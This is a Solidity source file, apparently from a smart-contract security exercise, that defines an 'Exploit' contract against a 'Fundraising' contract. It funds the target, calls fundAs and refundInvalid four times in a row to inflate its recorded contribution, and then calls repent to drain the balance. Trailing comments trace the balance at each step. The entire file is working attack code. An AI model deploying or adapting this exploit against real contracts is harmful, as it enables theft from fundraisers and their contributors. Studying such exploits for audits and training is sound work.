// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "./Fundraising.sol";
import "hardhat/console.sol";

contract Exploit {
    Fundraising instance;

    constructor(Fundraising _instance) payable {
        instance = _instance;
    }

    function finalize() external payable {
        instance.fund{value: 1000 gwei}();

        instance.fundAs{value: 500 gwei}(tx.origin);
        instance.refundInvalid(tx.origin);
        instance.fundAs{value: 500 gwei}(tx.origin);
        instance.refundInvalid(tx.origin);
        instance.fundAs{value: 500 gwei}(tx.origin);
        instance.refundInvalid(tx.origin);
        instance.fundAs{value: 500 gwei}(tx.origin);
        instance.refundInvalid(tx.origin);

        instance.repent();
    }

    receive() external payable {}
}

// balance 1000 gwei
// fund 1000 gwei => balance 2000 gwei
// fundAs 500 gwei a X => balance 2500 gwei
// refundInvalid => fund 1250 => balance 2000
// fundAs 500 gwei a X => balance 2500 gwei
// refundInvalid => fund 1500 => balance 2000
// fundAs 500 gwei a X => balance 2500 gwei
// refundInvalid => fund 1750 => balance 2000
// fundAs 500 gwei a X => balance 2500 gwei
// refundInvalid => fund 2000 => balance 2000
// repent
